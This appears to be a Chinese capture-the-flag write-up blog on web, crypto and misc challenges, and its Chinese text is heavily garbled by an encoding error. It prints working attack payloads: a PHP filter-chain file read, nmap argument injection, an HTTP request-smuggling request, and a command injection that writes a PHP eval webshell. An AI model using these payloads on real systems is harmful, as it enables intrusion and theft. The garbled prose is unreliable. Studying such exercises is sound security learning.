UTF7|convert.iconv.CP367.UTF-\r16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-\rdecode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|co\rnvert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-\r16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|conver\rt.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-\r16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-\rdecode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|co\rnvert.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-\r16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-\rdecode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR\r|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-\r932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-\rdecode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-\r16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-\r932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-\rdecode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-\rdecode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-\rdecode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-\r156.JOHAB|convert.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|conver\rt.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|co\rnvert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-\r932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-\rdecode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-\rdecode/resource=php://temp\u0026amp;0=cat%20/f*\r#æ­¤æ­¥æ¥æºäºhttps://www.cnblogs.com/mumuhhh/articles/17860683.html scan_tool #\rnmapè¿™ä¸ªå·¥å…·åœ¨ç½‘é¼æ¯é‡Œå‡ºç°è¿‡\nBUUCTF [ç½‘é¼æ¯ 2020 æœ±é›€ç»„] Nmap_[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]nmap-CSDNåšå®¢\nä¸è¿‡è¿™é‡Œè¿‡æ»¤çš„æ›´ä¸¥æ ¼ï¼Œæ— æ³•ç›´æ¥å†™å…¥phpä¸€å¥è¯æœ¨é©¬\nä¼ å…¥å‚æ•°ï¼š\u0026#39; --excludefile /flag -oA aaa \u0026#39; ç„¶åè®¿é—®aaa.nmapï¼Œå³å¯å¾—åˆ°flag\nEZ_Smuggling #\ré¢˜ç›®æ˜¯ä¸httpèµ°ç§æœ‰å…³çš„ï¼Œä¸ä¼šå†™ï¼Œå‚è€ƒæå®¢å¤§æŒ‘æˆ˜2023 Webæ–¹å‘é¢˜è§£wp å…¨-CSDNåšå®¢Jay17å¤§ä½¬çš„wpå¤ç°\nåªæœ‰adminæœ‰æƒé™è®¿é—®\nburpçš„repeaterè®¾ç½®å¦‚ä¸‹\nç„¶åæ„é€ å¦‚ä¸‹åŒ…\nPOST / HTTP/2\rHost: 47.108.56.168:20231\rCookie: session=MTcwMTE3OTIzMHxuU2xmbXJZUzlIZHJwalliY3NOX0RnZGdhZE9HeUY4LUN2R2dJbXFXZUJkVnR6MmM5WmE2NGtPMDBIZERFVGYySFBfaFZQZ1dUTmxsa2dwZzVSOGFPVFJyZENaZ1NfV3p8h5Vp25VTWKcqT3tjYkXwER7Dm1NS_lpbiohR-WJ5_xo=\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 0\rOrigin: https://47.108.56.168:20231\rReferer: https://47.108.56.168:20231/\rUpgrade-Insecure-Requests: 1\rSec-Fetch-Dest: document\rSec-Fetch-Mode: navigate\rSec-Fetch-Site: same-origin\rTe: trailers\rGET /admin HTTP/1.1\rHost: 47.108.56.168:20231\rCookie: session=MTcwMTE3OTIzMHxuU2xmbXJZUzlIZHJwalliY3NOX0RnZGdhZE9HeUY4LUN2R2dJbXFXZUJkVnR6MmM5WmE2NGtPMDBIZERFVGYySFBfaFZQZ1dUTmxsa2dwZzVSOGFPVFJyZENaZ1NfV3p8h5Vp25VTWKcqT3tjYkXwER7Dm1NS_lpbiohR-WJ5_xo=\rContent-Length: 1\rx=1 Crypto #\rSignIn #\rä¿¡æ¯å¦‚ä¸‹\nBibo...Hello! ä½ å¥½! ã“ã‚“ã«ã¡ã¯! ĞŸÑ€Ğ¸Ğ²ĞµÑ‚! 5359437b48656c6c6f5f576f726c645f43727970746f5f6269626f6269626f7dâ€¦ Hmm... Something goes wrong with my grettings bot. åå…­è¿›åˆ¶è½¬æ¢å­—ç¬¦ä¸²å¾—åˆ°flag\nproof_of_work #\ré¢˜ç›®è¦æ±‚nc\nè¿™å°±è¦å†™è„šæœ¬æ¥çˆ†ç ´äº†ï¼Œé¢˜ç›®æ˜¯åŠ¨æ€çš„\nimport hashlib\rimport itertools\rfrom string import digits, ascii_letters, punctuation\ralpha_bet = digits + ascii_letters + punctuation\rstrlist = itertools.product(alpha_bet, repeat=4)\rsha256 = \u0026#34;c400239e68f0b952313b370b4f6430fa80d006f4b8bf9949e9e3e211b1f3df88\u0026#34;\rtail = \u0026#34;wFk2UJk5eKncaTiz\u0026#34;\rxxxx = \u0026#39;\u0026#39;\rfor i in strlist:\rdata = i[0] + i[1] + i[2] + i[3]\rdata_sha = hashlib.sha256((data + tail).encode(\u0026#39;utf-8\u0026#39;)).hexdigest()\rif data_sha == sha256:\rxxxx = data\rbreak\rprint(xxxx) OldAlgorithm #\rAn old algorithm but widely used nowadays.\nfrom Crypto.Util.number import * import os flag = b\u0026#34;SYC{Al3XEI_FAKE_FLAG}\u0026#34;\rpad = lambda msg,padlen: msg+os.urandom(padlen-len(msg))\rflag = pad(flag,32)\rprint(len(flag))\rp = [getPrime(16) for _ in range(32)] c = [bytes_to_long(flag)%i for i in p] print(\u0026#39;p=\u0026#39;,p)\rprint(\u0026#39;c=\u0026#39;,c)\r\u0026#39;\u0026#39;\u0026#39;\rp= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]\rc= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]\r\u0026#39;\u0026#39;\u0026#39; è„šæœ¬å¦‚ä¸‹ğŸ‘‡\nfrom Crypto.Util.number import *\rimport os\rfrom sympy.ntheory.modular import crt\rflag = b\u0026#34;SYC{Al3XEI_FAKE_FLAG}\u0026#34;\rpad = lambda msg, padlen: msg+os.urandom(padlen-len(msg))\rflag = pad(flag, 32)\r# æ ¹æ®åŸå§‹ä»£ç ç”Ÿæˆçš„è´¨æ•°åˆ—è¡¨å’Œä½™æ•°åˆ—è¡¨\rp = [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]\rc = [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]\r# ä½¿ç”¨ crt å‡½æ•°è§£å¯†å¾—åˆ°åŸå§‹æ¶ˆæ¯\rx = crt(p, c, check=False)\rmsg = long_to_bytes(x[0] % x[1])\rprint(msg) MISC #\rcheekin #\rè¯·å‰å¾€\u0026quot;ä¸‰å¶è‰å°ç»„Syclover\u0026quot;å¾®ä¿¡å…¬ä¼—å·è¾“å…¥flagè·å¾—flag\nRGBå›¾ç‰‡éšå†™\nez_smilemo #\ræ¸¸æˆé€šå…³å³å¯å¾—åˆ°flagå†…å®¹ï¼Œéœ€è¦è‡ªè¡Œæ·»åŠ `SYC{}`åŒ…å«ã€‚ä¾‹: flagå†…å®¹ä¸º haha_haha åˆ™æœ€ç»ˆflagä¸º SYC{haha_haha} é¢˜ç›®é“¾æ¥ï¼šhttps://pan.baidu.com/s/1Vfklz0_isBoHNylRv8um8w?pwd=geek hint: data.win\næ¸¸æˆè¿™é‡Œå°±ä¸ç©äº†ï¼Œç›´æ¥å»åˆ†ædata.winå§ï¼Œè¿›å»ä¸‹é¢çš„è¿æ¥ï¼Œåˆ†æwin\nå¦‚ä½•åœ¨æ²¡æœ‰ Visual FoxPro çš„æƒ…å†µä¸‹æ‰“å¼€ WIN æ–‡ä»¶ (filext.com)\nbase64è§£ç å³å¯\nDEATH_N0TE #\r\u0026ldquo;o2takuXXçªç„¶å¤±è¸ªäº†ï¼Œä½ ä½œä¸ºä»–çš„å¥½æœ‹å‹ï¼Œå†³å®šå»ä»–çš„æˆ¿é—´çœ‹çœ‹æ˜¯å¦ç•™ä¸‹äº†ä»€ä¹ˆçº¿ç´¢\u0026hellip;\u0026quot;ã€‚å‰ç½®å‰§æƒ…é¢˜ï¼Œflagæœ‰ä¸¤æ®µï¼Œéšå†™çš„ä¿¡æ¯æœ‰ç‚¹å¤šè®°å¾—ç»™ä¿¡æ¯æ‹¿å…¨ã€‚ hint1: Stegsolve lsb hint2: å›¾ç‰‡å¤§å°å’Œåƒç´ ç‚¹\næ‰¾åˆ°ä¸€åŠflagï¼Œå°†å›¾ç‰‡æ”¾å¤§çœ‹ï¼Œèƒ½çœ‹åˆ°ä¸€äº›åƒç´ ç‚¹ï¼Œä½†æ˜¯ä¸æ¸…æ™°\nåˆ©ç”¨pythonè„šæœ¬ç¼©å°ä¸€ä¸‹\nfrom PIL import Image\rimg = Image.open(\u0026#39;kamisama.png\u0026#39;)\rw = img.width\rh = img.height\rimg_obj = Image.new(\u0026#34;RGB\u0026#34;,(w//5,h//5))\rfor x in range(w//5):\rfor y in range(h//5):\rpixel = img.getpixel((x*5,y*5))\rif len(pixel) == 3:\r(r, g, b) = pixel\rimg_obj.putpixel((x, y), (r, g, b))\relif len(pixel) == 4:\r(r, g, b, _) = pixel\rimg_obj.putpixel((x, y), (r, g, b))\rimg_obj.save(\u0026#39;123.png\u0026#39;) å¾—åˆ°ä¸€äº›å¥‡æ€ªçš„æ–‡å­—ï¼Œæœç´¢ä¸€ä¸‹æ­»äº¡ç¬”è®°å­—ä½“\nä¸‹ä¸€ç«™æ˜¯å“ªå„¿å‘¢ #\ræˆ‘å’Œyxxå»æ—…æ¸¸ï¼Œå‰ä¸€å¤©è¿˜å¥½å¥½çš„ï¼Œç©å®Œã€ŠæŒ‡æŒ¥å®˜åŸºæ©ã€‹è¿™ä¸ªæ¸¸æˆå°±ç¡è§‰äº†ï¼Œç¬¬äºŒå¤©æ™šä¸Šåƒå®Œé¥­å¥¹äººå°±ä¸è§äº†ï¼Œèµ°ä¹‹å‰ç•™ä¸‹äº†ä¸¤å¼ å›¾ç‰‡å°±æ¶ˆå¤±äº†ã€‚ä½ èƒ½å¸®æˆ‘æ‰¾æ‰¾å¥¹åå“ªä¸ªèˆªç­å»å“ªä¸ªåœ°æ–¹äº†å˜›ï¼ŸÂ flagæ ¼å¼ï¼šSYC{èˆªç­å·_åŸå¸‚æ‹¼éŸ³}ï¼ŒåŸå¸‚æ‹¼éŸ³é¦–å­—æ¯å¤§å†™å™¢\nç™¾åº¦è¯†å›¾ä¸€ä¸‹\nå¾—çŸ¥å‡ºå‘åœ°æ˜¯æ·±åœ³å®å®‰ï¼Œç”¨010editorçœ‹çœ‹çŒªçŒªä¾ çš„å›¾ç‰‡\nåœ¨ä¸­éƒ¨å‘ç°æœ‰ä¸œè¥¿\næ”¾è¿›kaliè™šæ‹Ÿæœºé‡Œbinwalkåˆ†ç¦»ä¸€ä¸‹\næœ‰ä¸€ä¸ªsecret.pngå’Œä¸€ä¸ªtxt\nä¸€æ®µçœ‹ä¸æ‡‚çš„æ–‡å­—ï¼Œä½†æ˜¯æ ¹æ®æç¤ºï¼Œåº”è¯¥æ˜¯æŒ‡æŒ¥å®˜åŸºæ©ä¸­çš„æ–‡å­—ï¼Œæœç´¢ä¸€ä¸‹\nç¿»è¯‘è¿‡æ¥æ˜¯ I WANT TO GO TO LIQUOR CITYï¼ˆæˆ‘æƒ³å»é…’åŸï¼‰\né…’åŸæ˜¯æ³¸å·çš„åˆ«ç§°ï¼Œæ ¹æ®èŠå¤©å›¾ï¼Œåªéœ€è¦æŸ¥æ‰¾8æœˆ25æ—¥ä»æ·±åœ³å®å®‰åˆ°æ³¸å·çš„èˆªç­å°±è¡Œäº†\nç”¨è¿™ä¸ªç½‘ç«™ï¼šèˆªçº¿å›¾-Variflightèˆªçº¿å›¾æ³¨å†Œä¸€ä¸‹å°±è¡Œäº†\næ ¹æ®æ—¶é—´å¯çŸ¥ï¼Œèˆªç­å·ä¸ºCZ8579\nQingwanå¿ƒéƒ½è¦ç¢äº† #\rQingwanå’ŒYxxä¸€èµ·å»æ—…æ¸¸ï¼Œä½†æ˜¯Qingwanç¡çš„å¤ªæ­»å•¦ï¼ŒYxxä¸¢ä¸‹å¥¹ä¸€ä¸ªäººå»ç©äº†ï¼Œå¥¹ä¸€è§‰èµ·æ¥åªçœ‹è§Yxxå‘çš„æœ‹å‹åœˆï¼Œèƒ½å¸®Qingwanæ‰¾åˆ°å¥¹å—ï¼ŸÂ flagæ ¼å¼ï¼šSYC{åœ°ç‚¹åå­—}\nç£å™¨å£æ˜¯åœ¨é‡åº†ï¼Œå…ˆç¼©å°èŒƒå›´\nå‘ç°ä¸‰å³¡ä¸¤ä¸ªå­—ï¼Œé‚£å°±ç”¨é‡åº†+ä¸‰å³¡+åšç‰©é¦†ä½œä¸ºå…³é”®å­—æœç´¢ä¸€ä¸‹\nå¾—å‡ºé‡åº†ä¸­å›½ä¸‰å³¡åšç‰©é¦†\nxqr #\rQrcode can deliver binary msg\né¢˜ç›®ç»™äº†ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«äº†æ˜¯fakeflag\næ‹¿è¿›010editorçœ‹çœ‹\nå‘ç°è¿˜éšè—äº†å¦å¤–ä¸€å¼ å›¾ç‰‡\nç›´æ¥å¤åˆ¶89 50 4E 47åé¢çš„å…¨éƒ¨å†…å®¹ï¼Œåœ¨010ä¸Šé¢æ–°å»ºå¦ä¸€ä¸ªpngï¼Œç”¨ctrl+shift+vç²˜è´´ï¼Œç„¶åå¾—åˆ°å›¾ç‰‡\nä½†æ˜¯å…¶ä»–å¤§å°åªæœ‰25*25ï¼Œè€Œé™„ä»¶å›¾ç‰‡æœ‰75*75ï¼Œæ‰“å¼€ç”»å›¾\nä¿®æ”¹åä¿å­˜ï¼Œæ‰“å¼€stegsolveï¼Œé€‰image combiner\nXORåå¾—åˆ°ä¸€å¼ å›¾ï¼Œå®šä½ç‚¹éƒ½æ˜¯æœ‰çš„ï¼Œä¸è¿‡è¿˜æ˜¯æ‰«ä¸å‡ºæ¥çš„ï¼Œå°†å…¶ä¿å­˜ä¸‹æ¥\né€‰æ‹©åè‰²\nå¾—åˆ°çš„è¿™ä¸ªäºŒç»´ç å°±èƒ½æ‰«äº†\n","date":"2023-11-02","externalUrl":null,"permalink":"/posts/2023/11/geekchallenge2023/","section":"Posts","summary":"","title":"æå®¢å¤§æŒ‘æˆ˜2023","type":"posts"},{"content":"\rWEEK1 #\rsignin #\rè¿›å»åªæœ‰ä¸€ä¸ªé¡µé¢\næºä»£ç é‡Œæ²¡æœ‰ä¸œè¥¿ï¼Œæ‰«æåå°ä¹Ÿæ²¡æœ‰ä¸œè¥¿\næ”¾è¿›ç«ç‹æµè§ˆå™¨ï¼ŒF12è¿›å…¥è°ƒè¯•å™¨\nåœ¨æºç é‡Œå‘ç°flag\nbaby_php #\ræºç å¦‚ä¸‹\n\u0026lt;?php\r// flag in flag.php\rhighlight_file(__FILE__);\rif (isset($_GET[\u0026#39;a\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;b\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;c\u0026#39;]) \u0026amp;\u0026amp; isset($_COOKIE[\u0026#39;name\u0026#39;])) {\r$a = $_GET[\u0026#39;a\u0026#39;];\r$b = $_GET[\u0026#39;b\u0026#39;];\r$c = $_POST[\u0026#39;c\u0026#39;];\r$name = $_COOKIE[\u0026#39;name\u0026#39;];\rif ($a != $b \u0026amp;\u0026amp; md5($a) == md5($b)) {\rif (!is_numeric($c) \u0026amp;\u0026amp; $c != 1024 \u0026amp;\u0026amp; intval($c) == 1024) {\rinclude($name.\u0026#39;.php\u0026#39;);\r}\r}\r}\r?\u0026gt; é¦–å…ˆæ˜¯aå’Œbçš„MD5å¼±æ¯”è¾ƒ\nè¿™ä¸ªå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ç”¨å­—ç¬¦ä¸²ç¢°æ’\nè¿™é‡Œå¯ä»¥ä½¿ç”¨è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼šQNKCDZO ã€ 240610708\nç„¶åå°±æ˜¯å˜é‡cï¼Œé¦–å…ˆè¦ä¸èƒ½æ˜¯æ•°å­—\nåœ¨å°¾éƒ¨æ·»åŠ %00æˆ–è€…%20ç­‰urlç¼–ç å­—ç¬¦ä¼šè®©is_numericå‡½æ•°åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œåœ¨å°¾éƒ¨æ·»åŠ éæ•°å­—ä¹Ÿå¯ä»¥è¾¾åˆ°è¿™ç§æ•ˆæœï¼Œæ•°ç»„ç»•è¿‡ä¹Ÿæ˜¯å¯ä»¥çš„\nç„¶åå°±æ˜¯å˜é‡å€¼ä¸èƒ½ç­‰äº1024ï¼Œintvalå€¼è¦ç­‰äº1024\nintvalå‡½æ•°ä¸€èˆ¬çš„ç»•è¿‡æ€è·¯ğŸ‘‡\nå½“æŸä¸ªæ•°å­—è¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å®ƒçš„ 8è¿›åˆ¶/16è¿›åˆ¶æ¥ç»•è¿‡ï¼›æ¯”å¦‚è¿‡æ»¤10ï¼Œå°±ç”¨012ï¼ˆå…«è¿›åˆ¶ï¼‰æˆ–0xAï¼ˆåå…­è¿›åˆ¶ï¼‰ã€‚\nå¯¹äºå¼±æ¯”è¾ƒï¼ˆa==bï¼‰ï¼Œå¯ä»¥ç»™aã€bä¸¤ä¸ªå‚æ•°ä¼ å…¥ç©ºæ•°ç»„ï¼Œä½¿å¼±æ¯”è¾ƒä¸ºtrueã€‚\næŸä¸ªæ•°å­—è¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥ç»™å®ƒå¢åŠ å°æ•°ä½æ¥ç»•è¿‡ï¼›æ¯”å¦‚è¿‡æ»¤3ï¼Œå°±ç”¨3.1ã€‚\nå½“æŸä¸ªæ•°å­—è¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥ç»™å®ƒæ‹¼æ¥å­—ç¬¦ä¸²æ¥ç»•è¿‡ï¼›æ¯”å¦‚è¿‡æ»¤3ï¼Œå°±ç”¨3abã€‚ï¼ˆGETè¯·æ±‚çš„å‚æ•°ä¼šè‡ªåŠ¨æ‹¼æ¥å•å¼•å·ï¼‰\nå½“æŸä¸ªæ•°å­—è¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥ä¸¤æ¬¡å–åæ¥ç»•è¿‡ï¼›æ¯”å¦‚è¿‡æ»¤10ï¼Œå°±ç”¨~~10ã€‚\nå½“æŸä¸ªæ•°å­—è¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç®—æ•°è¿ç®—ç¬¦ç»•è¿‡ï¼›æ¯”å¦‚è¿‡æ»¤10ï¼Œå°±ç”¨ 5+5 æˆ– 2*5ã€‚\nè¿™é‡Œå‰åè§‚å¯Ÿä¸€ä¸‹ï¼Œå°±èƒ½å¾—å‡ºåªè¦cä¸º 1024.1123 è¿™æ ·ï¼Œå¸¦ä¸ªå°æ•°éƒ¨åˆ†å°±è¡Œäº†\nç”±äºflagåœ¨flag.phpé‡Œï¼Œincludeé‡Œåˆæœ‰å­—ç¬¦ä¸²çš„è¿æ¥ï¼Œè¿™é‡ŒæŠ“ä¸ªåŒ…æ·»åŠ ä¸€ä¸ªcookieå¤´å°±è¡Œäº†\nä¸è¿‡è¿™æ ·å¹¶æ²¡æœ‰æ˜¾ç¤ºflagï¼Œæˆ–è®¸æ˜¯flag.phpæ–‡ä»¶é‡Œå¹¶æ²¡æœ‰highlighté«˜äº®æ–‡ä»¶\nä½†æ˜¯é€šè¿‡includeæ–‡ä»¶åŒ…å«ï¼Œå¯ä»¥ä½¿ç”¨phpä¼ªåè®®è¯»å–æ–‡ä»¶å†…å®¹\nè¿™é‡Œåªéœ€è¦ä½¿ç”¨filterä¼ªåè®®å°±èƒ½è¯»å‡ºæ–‡ä»¶æºç äº†\næ‹¿å»base64è§£å¯†ä¸€ä¸‹å°±èƒ½æ‹¿åˆ°flag\nhello_http #\rç¬¬ä¸€å±‚ï¼š\nError: The GET parameter query must be ctf ä¼ å…¥ä¸€ä¸ªGETå˜é‡queryï¼Œå€¼ä¸ºctf\nç¬¬äºŒå±‚ï¼š\nError: The POST form action must be getflag ä¼ å…¥ä¸€ä¸ªPOSTå˜é‡actionï¼Œå€¼ä¸ºgetflag\nç¬¬ä¸‰å±‚ï¼š\nError: Your are not admin ä¿®æ”¹Cookieçš„roleä¸ºadminå³å¯\nç¬¬å››å±‚ï¼š\nError: Only allow local IP ç”¨burpsuiteæŠ“åŒ…ï¼Œæ·»åŠ X-Forwarded-Forå¤´ï¼Œå€¼ä¸º127.0.0.1\nç¬¬äº”å±‚ï¼š\nError: You are not using HarmonyOS Browser\nä¿®æ”¹User-Agentå­—æ®µä¸ºHarmonyOS Browserï¼ˆä¸­é—´æœ‰ä¸ªç©ºæ ¼\nç¬¬å…­å±‚ï¼š\nError: Only allow access from ys.mihoyo.com æ·»åŠ Refererå¤´ï¼Œå€¼ä¸ºys.mihoyo.comï¼Œåˆ°æ­¤ç»“æŸæ‹¿åˆ°flag\næœ€ç»ˆå¦‚å›¾\nrepo_leak #\rä¸€ä¸ªåšå®¢ç½‘ç«™ï¼Œæºç é‡Œæ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œç›´æ¥å¼€å§‹æ‰«åå°\næ‰«å‡ºæ¥DSæ–‡ä»¶\n.DS_Storeæ˜¯Macä¸‹Finderç”¨æ¥ä¿å­˜å¦‚ä½•å±•ç¤º æ–‡ä»¶/æ–‡ä»¶å¤¹ çš„æ•°æ®æ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶å¤¹ä¸‹å¯¹åº”ä¸€ä¸ªã€‚\nå¦‚æœå¼€å‘/è®¾è®¡äººå‘˜å°†.DS_Storeä¸Šä¼ éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒï¼Œå¯èƒ½é€ æˆæ–‡ä»¶ç›®å½•ç»“æ„æ³„æ¼ï¼Œç‰¹åˆ«æ˜¯å¤‡ä»½æ–‡ä»¶ã€æºä»£ç æ–‡ä»¶ã€‚\nè¿™ä¸ªæ–‡ä»¶åœ¨windowsä¸‹æ˜¯æ— æ³•æŸ¥çœ‹çš„ï¼Œä¼šäº§ç”Ÿä¹±ç \nè¦æ”¾åˆ°kaliæˆ–è€…å…¶ä»–linuxç³»ç»Ÿä¸‹æ‰èƒ½æŸ¥çœ‹\nä½†æ˜¯å¹¶æ²¡æœ‰ç”¨ï¼Œè¿™é‡Œè€ƒçš„ä¸æ˜¯è¿™ä¸ª\nç»™äº†æç¤ºï¼Œè¦çœ‹gitç‰ˆæœ¬ï¼Œflagåº”è¯¥åœ¨ä¹‹å‰çš„æŸä¸ªç‰ˆæœ¬ä¸­\nè¿™é‡Œè¦ç”¨åˆ°githackerè¿™ä¸ªå·¥å…·æ‰è¡Œï¼Œgithackåœ¨è¿™é‡Œç”¨ä¸äº†\n#å®‰è£…githacker\rpython -m pip install -i https://pypi.org/simple/ GitHacker #python3ç¯å¢ƒä¸‹\r#è¿è¡Œ\rgithacker --url http://120.27.148.152:50013/.git/ --output-folder éšä¾¿èµ·ä¸€ä¸ªç›®å½• å®Œæˆä¹‹åcdè¿›å»\nèƒ½çœ‹åˆ°æœ‰flagï¼Œåˆ‡æ¢ä¸€ä¸‹ç‰ˆæœ¬\nç„¶åè¿›å…¥æ–‡ä»¶å¤¹çœ‹çœ‹ï¼Œæ‰“å¼€index.htmlçš„æºç \næŸ¥æ‰¾ä¸€ä¸‹flag\nping #\rçœ‹èµ·æ¥æ˜¯ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œ\nåœ¨æºç é‡Œå‘ç°hint\nä»£ç å¦‚ä¸‹\n\u0026lt;?php\rfunction sanitize($s) {\r$s = str_replace(\u0026#39;;\u0026#39;, \u0026#39;\u0026#39;, $s);\r$s = str_replace(\u0026#39; \u0026#39;, \u0026#39;\u0026#39;, $s);\r$s = str_replace(\u0026#39;/\u0026#39;, \u0026#39;\u0026#39;, $s);\r$s = str_replace(\u0026#39;flag\u0026#39;, \u0026#39;\u0026#39;, $s);\rreturn $s;\r}\rif (isset($_GET[\u0026#39;source\u0026#39;])) {\rhighlight_file(__FILE__);\rdie();\r}\rif (!isset($_POST[\u0026#39;ip\u0026#39;])) {\rdie(\u0026#39;No IP Address\u0026#39;);\r}\r$ip = $_POST[\u0026#39;ip\u0026#39;];\r$ip = sanitize($ip);\rif (!preg_match(\u0026#39;/((\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])\\.){3}(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])/\u0026#39;, $ip)) {\rdie(\u0026#39;Invalid IP Address\u0026#39;);\r}\rsystem(\u0026#39;ping -c 4 \u0026#39;.$ip. \u0026#39; 2\u0026gt;\u0026amp;1\u0026#39;);\r?\u0026gt; èƒ½çœ‹åˆ°å½“å‰ç›®å½•çš„ä¸€äº›ä¸œè¥¿\nä¸è¿‡åæ–œæ è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œæ— æ³•ä½¿ç”¨\nç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œä¸è¿‡å¯ä»¥ç”¨$IFSã€${IFS}ç­‰ä»£æ›¿\nå°–æ‹¬å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™å…¥phpæ–‡ä»¶\nå¯ä»¥é…åˆbase64ç¼–ç æ¥å†™å…¥æ–‡ä»¶\nip=127.0.0.1|echo$IFS\u0026#34;PD9waHAgZXZhbCgkX1BPU1RbYV0pOz8+\u0026#34;|base64${IFS}-d${IFS}\u0026gt;a.php\r#\u0026lt;?php eval($_POST[a]);?\u0026gt; ç„¶åè®¿é—®a.php\nå°±èƒ½æ‹¿åˆ°flag\nWEEK2 #\rå‰è¨€ #\rç”±äºweek2çš„é¢˜éš¾åº¦è¦æ¯”week1çš„å¤§ä¸€äº›\nå‡ºé¢˜äººä¹Ÿæ˜¯ä¸æ–­çš„ç»™hint\nez_sqli #\rhintå¦‚ä¸‹ğŸ‘‡\nHint 1: Docker ç¯å¢ƒ: mysql:5.7\rHint 2: å †å æ³¨å…¥ (cursor.execute() èƒ½å¤Ÿæ‰§è¡Œå¤šæ¡ SQL è¯­å¥)\rHint 3: å…³é”®è¯: set prepare executeHint 4: flag ä½ç½®: select flag from flag\rHint 5: è¯·ä¸è¦ä½¿ç”¨ sqlmap ç­‰è‡ªåŠ¨åŒ–å·¥å…· è·‘ä¸å‡ºæ¥çš„\rHint 6: å°è¯•é€šè¿‡ set è®¾ç½®ä¸€ä¸ªå˜é‡ 